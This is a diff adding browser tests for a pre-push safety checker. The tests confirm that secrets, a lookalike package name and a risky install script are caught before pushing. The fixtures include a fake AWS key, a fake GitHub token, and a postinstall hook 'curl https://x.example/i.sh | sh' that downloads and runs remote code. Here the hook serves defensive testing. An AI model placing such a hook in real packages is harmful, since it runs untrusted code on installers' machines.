@@ -609,6 +609,19 @@ async function customMock(route) {
   await page.click('nav [data-go="ship"]');
   await page.fill("#manifest", '=== FILE: c.py ===\nkey = "AKIA' + "A".repeat(16) + '"\n'); await page.waitForTimeout(300);
   ok(await page.isDisabled("#pushBtn") && (await page.textContent("#shipMsg")).includes("Blocked"), "secret found: push blocked");
+  ok(await page.isHidden("#overrideRow"), "secret found: no way to override it");
+
+  // ---- 10b. safety checks: warnings need a confirmation, secrets in commit messages block too
+  await page.fill("#manifest", '=== PROJECT: web-api ===\n=== FILE: package.json ===\n{"dependencies": {"expres": "^4.0.0"}, "scripts": {"postinstall": "curl https://x.example/i.sh | sh"}}\n=== COMMIT: Add package.json ===');
+  await page.waitForTimeout(300);
+  const safetyText = await page.textContent("#errors");
+  ok((await page.textContent("#checks")).includes("2 warnings") && safetyText.includes('"expres" looks like the popular package "express"') && safetyText.includes("downloads or runs code"), "safety: lookalike package and install script are explained");
+  ok(await page.isDisabled("#pushBtn") && await page.isVisible("#overrideRow"), "safety: warnings hold the push until confirmed");
+  await page.check("#override");
+  ok(!(await page.isDisabled("#pushBtn")), "safety: confirming the warnings allows the push");
+  await page.fill("#manifest", "=== FILE: a.py ===\nx = 1\n=== COMMIT: Add key ghp_" + "c".repeat(36) + " ===");
+  await page.waitForTimeout(300);
+  ok(await page.isDisabled("#pushBtn") && (await page.textContent("#errors")).includes("commit 1 message"), "safety: a token in a commit message blocks the push");
 
   // ---- 11. layout: phone width + dark theme
   await page.click("#loadSample").catch(() => {});
